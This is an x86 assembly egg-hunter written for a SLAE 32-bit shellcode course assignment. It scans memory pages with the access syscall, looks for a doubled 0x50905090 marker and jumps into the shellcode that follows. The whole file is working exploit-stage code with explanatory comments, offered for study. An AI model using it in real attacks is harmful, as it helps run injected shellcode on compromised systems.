; Filename:	assignment_03.nasm
; Author:  	Ignacio Lahoz
; Website:  http://https://medium.com/@nlahoz/slae-assignment-3-bd81f6ca9482
;
;
; Purpose: Assigment 03 - EGG HUNTER - SLAE 32 bits course

global _start

section .text
_start:

	xor ecx, ecx
	mul ecx 			                    ; This will zero EAX and EDX due to the multiplication operation

next_page: ; To align page

	; VAS organized by pages
  ; PAGE_SIZE = 4096 --> 0x1000 which contain nulls. To prevent this will use 0xfff (4095) and then add 1 --> 0x1000 (4096)
	; Page alignment operation on the current pointer that is being validated by doing a bitwise
	; OR operation on the low 16-bits of the current pointer (to be stored in edx) and then incrementing edx by one.
	; This operation is equivalent to adding 0x1000 to the value in edx.

	or dx, 0xfff 			                ; next instruction inc edx to move to the next page

next_address:

	inc edx 			                    ; 0xfff + 1 --> 0x1000 (4096)

	; ACCESS
	; int access(const char *pathname, int mode);
	; syscall --> 33 (0x21)
	; Arguments:
	; EDX: *pathnames = address currently checking
	; ECX: mode - F_OK = 0

	lea ebx, [edx + 0x4]		          ; We load contents of memory into EBX (pathname)
	xor eax, eax			                ; zero eax
	mov al, 0x21			                ; ACCESS system call
	int 0x80      

	; MEMORY VALIDATION
	cmp al, 0xf2 			                ; Memory validation. In case of error (EFAULT) ACCESS syscall will return a negative number
					                          ; in EAX --> fffffff2 (-14). Then, the low bit of EAX is compared againts 0xf2 to verifiy if
					                          ; an error was returned. Meaning that the memory address was not accessible so the jump
					                          ; instruction will take place

	jz short next_page		            ; cannot access memory address jump to next memory page

	cmp dword [edx], 0x50905090 	    ; First comparison with our EGG (0x50905090)
	jnz short next_address

	cmp dword [edx + 0x4], 0x50905090 ; Second comparison with our EGG (0x50905090)
        jnz short next_address

	add edx, 0x8 			                ; Point past the two consecutive egg placed at the begining of our shellcode (0x50905090)
	jmp edx 			                    ; execution of our shellcode --> jump to edx which point to the begining of our shellcode
